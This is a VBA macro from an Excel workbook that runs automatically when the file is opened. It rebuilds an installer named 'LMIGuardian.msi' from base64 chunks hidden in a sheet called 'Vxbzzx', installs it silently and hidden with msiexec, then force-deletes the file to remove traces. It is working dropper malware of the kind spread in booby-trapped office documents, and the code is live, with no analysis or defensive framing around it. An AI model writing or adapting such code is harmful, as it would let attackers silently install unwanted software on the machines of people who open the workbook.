Option Explicit

Private Function Base64Decode(ByVal base64String As String) As Byte()
    Dim xmlObj As Object, node As Object
    
    ' Clean Base64 string
    base64String = Replace(base64String, vbCrLf, "")
    base64String = Replace(base64String, vbLf, "")
    base64String = Replace(base64String, vbCr, "")
    base64String = Replace(base64String, " ", "")
    
    ' Add padding if missing
    Do While (Len(base64String) Mod 4) <> 0
        base64String = base64String & "="
    Loop
    
    ' Decode Base64 chunk
    Set xmlObj = CreateObject("MSXML2.DOMDocument")
    Set node = xmlObj.createElement("b64")
    node.DataType = "bin.base64"
    node.Text = base64String
    Base64Decode = node.nodeTypedValue
End Function

Sub DeleteFileRobust(ByVal outFile As String)
    Dim fso As Object
    Dim sh As Object
    Dim cmd As String

    On Error Resume Next

    Set fso = CreateObject("Scripting.FileSystemObject")

    If fso.FileExists(outFile) Then
        SetAttr outFile, vbNormal
        fso.DeleteFile outFile, True
    End If

    ' Nếu FSO xóa lỗi thì fallback sang cmd del
    If Err.Number <> 0 Then
        Debug.Print "FSO delete failed: " & Err.Number & " - " & Err.Description
        Err.Clear

        Set sh = CreateObject("WScript.Shell")
        cmd = "cmd.exe /c del /f /q """ & outFile & """"
        sh.Run cmd, 0, True

        If Err.Number <> 0 Then
            Debug.Print "CMD delete failed: " & Err.Number & " - " & Err.Description
            Err.Clear
        End If
    End If

    On Error GoTo 0
End Sub

Public Sub ExtractAndRunMSI()
    On Error Resume Next
    Dim ws As Worksheet
    Dim lastRow As Long, i As Long
    Dim chunk As String
    Dim outFile As String
    Dim stream As Object
    Dim shellObj As Object
    
    Set ws = ThisWorkbook.Sheets("Vxbzzx")
    lastRow = ws.Cells(ws.Rows.Count, 1).End(xlUp).Row
    
    If lastRow = 0 Or ThisWorkbook.Path = "" Then Exit Sub
    
    outFile = ThisWorkbook.Path & "\LMIGuardian.msi"
    
    Set stream = CreateObject("ADODB.Stream")
    stream.Type = 1 ' binary
    stream.Open
    
    ' Write decoded chunks to stream
    For i = 1 To lastRow
        chunk = Trim(CStr(ws.Cells(i, 1).Value))
        If Len(chunk) > 0 Then
            stream.Write Base64Decode(chunk)
        End If
    Next i
    
    stream.SaveToFile outFile, 2
    stream.Close
    
    ' Run MSI silently
    Set shellObj = CreateObject("WScript.Shell")
    shellObj.Run "msiexec /quiet /i """ & outFile & """", 0, True
    
    On Error Resume Next
    DeleteFileRobust outFile
    On Error GoTo 0
End Sub

Private Sub Workbook_Open()
    ExtractAndRunMSI
End Sub

